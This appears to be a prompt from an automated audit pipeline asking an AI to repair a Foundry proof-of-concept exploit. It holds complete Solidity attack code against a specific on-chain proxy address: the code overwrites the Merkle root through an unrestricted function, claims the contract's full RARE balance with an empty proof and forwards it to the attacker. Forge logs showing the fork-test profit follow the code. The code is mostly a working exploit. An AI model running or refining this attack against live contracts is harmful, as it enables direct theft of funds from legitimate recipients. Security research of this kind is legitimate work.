You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unrestricted `updateMerkleRoot()` lets any caller self-authorize arbitrary token claims
- claim: The reproduced exploit shows the target contract exposing `updateMerkleRoot(bytes32)` as an unrestricted external function. An attacker can set the Merkle root to a leaf they control, here `keccak256(abi.encodePacked(attacker, amount))`, and then call `claim(amount, [])`. Because the attacker-controlled leaf equals the whole tree root, an empty proof is sufficient and the claim succeeds for an arbitrary amount up to the contract's full token balance.
- impact: Any external account can overwrite the active distribution root and immediately drain all RARE held by the distribution/staking contract, causing direct theft of funds intended for legitimate recipients.
- exploit_paths: ["`testExploit()` computes `stakingContractBalance`, uses `fakeRoot`, then calls `AttackContract.attack(fakeRoot, stakingContractBalance)`", "`AttackContract.attack()` -> `IERC1967Proxy.updateMerkleRoot(newRoot)` -> `IERC1967Proxy.claim(amount, new bytes32[](0))`", "`fakeRoot` matches `keccak256(abi.encodePacked(ATTACK_CONTRACT, stakingContractBalance))`, so the attacker leaf is also the Merkle root and validates with an empty proof"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC1967Proxy {
    function updateMerkleRoot(bytes32 newRoot) external;
    function claim(uint256 amount, bytes32[] calldata proof) external;
}

contract AttackContract {
    address internal constant PROXY = 0x3f4D749675B3e48bCCd932033808a7079328Eb48;
    address internal constant RARE = 0xba5BDe662c17e2aDFF1075610382B9B691296350;

    address internal immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function getStakingContractBalance() public view returns (uint256) {
        return IERC20Minimal(RARE).balanceOf(PROXY);
    }

    function getTokenBalance() public view returns (uint256) {
        return IERC20Minimal(RARE).balanceOf(address(this));
    }

    function attack(bytes32 newRoot, uint256 amount) public {
        IERC1967Proxy target = IERC1967Proxy(PROXY);

        // Keep the original exploit causality:
        // 1) overwrite the active merkle root with an attacker-controlled root,
        // 2) claim using an empty proof because the attacker leaf is the full root.
        target.updateMerkleRoot(newRoot);

        bytes32[] memory proof = new bytes32[](0);
        target.claim(amount, proof);

        uint256 claimedBalance = IERC20Minimal(RARE).balanceOf(address(this));
        if (claimedBalance > 0) {
            IERC20Minimal(RARE).transfer(owner, claimedBalance);
        }
    }
}

contract FlawVerifier {
    address internal constant TARGET_IMPLEMENTATION = 0xfFB512B9176D527C5D32189c3e310Ed4aB2Bb9eC;
    address internal constant RARE = 0xba5BDe662c17e2aDFF1075610382B9B691296350;

    AttackContract public immutable attackContract;
    address internal immutable ATTACK_CONTRACT;
    uint256 internal immutable baselineProfitBalance;

    constructor() {
        AttackContract deployed = new AttackContract();
        attackContract = deployed;
        ATTACK_CONTRACT = address(deployed);
        baselineProfitBalance = IERC20Minimal(RARE).balanceOf(address(this));

        TARGET_IMPLEMENTATION;
    }

    function executeOnOpportunity() external {
        uint256 stakingContractBalance = attackContract.getStakingContractBalance();
        if (stakingContractBalance == 0) {
            return;
        }

        // Attempt strategy: direct_or_existing_balance_first.
        // No external funding is needed because the vulnerable proxy already holds
        // the victim RARE balance being stolen.
        bytes32 fakeRoot = keccak256(abi.encodePacked(ATTACK_CONTRACT, stakingContractBalance));
        attackContract.attack(fakeRoot, stakingContractBalance);
    }

    function testExploit() external {
        uint256 stakingContractBalance = attackContract.getStakingContractBalance();
        if (stakingContractBalance == 0) {
            return;
        }

        // Align with the provided exploit path:
        // testExploit() computes stakingContractBalance, derives fakeRoot from
        // keccak256(attacker, amount), then calls AttackContract.attack().
        bytes32 fakeRoot = keccak256(abi.encodePacked(ATTACK_CONTRACT, stakingContractBalance));
        attackContract.attack(fakeRoot, stakingContractBalance);
    }

    function profitToken() external pure returns (address) {
        return RARE;
    }

    function profitAmount() external view returns (uint256) {
        uint256 currentBalance = IERC20Minimal(RARE).balanceOf(address(this));
        if (currentBalance <= baselineProfitBalance) {
            return 0;
        }

        return currentBalance - baselineProfitBalance;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.38s
Compiler run successful with warnings:
Warning (6133): Statement has no effect.
  --> src/FlawVerifier.sol:64:9:
   |
64 |         TARGET_IMPLEMENTATION;
   |         ^^^^^^^^^^^^^^^^^^^^^

Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for src/FlawVerifier.sol:FlawVerifier
[FAIL: call to non-contract address 0xba5BDe662c17e2aDFF1075610382B9B691296350] constructor() (gas: 0)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 730.82µs (0.00ns CPU time)

Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[PASS] testExploit() (gas: 144732)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 577021548053172
  AUDITHOUND_BALANCE_AFTER_WEI: 577021548053172
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 11907874713019104529057960
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 11907874713019104529057960
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xba5BDe662c17e2aDFF1075610382B9B691296350
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 2141

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.57s (1.16s CPU time)

Ran 2 test suites in 2.58s (2.58s CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)

Failing tests:
Encountered 1 failing test in src/FlawVerifier.sol:FlawVerifier
[FAIL: call to non-contract address 0xba5BDe662c17e2aDFF1075610382B9B691296350] constructor() (gas: 0)

Encountered a total of 1 failing tests, 1 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
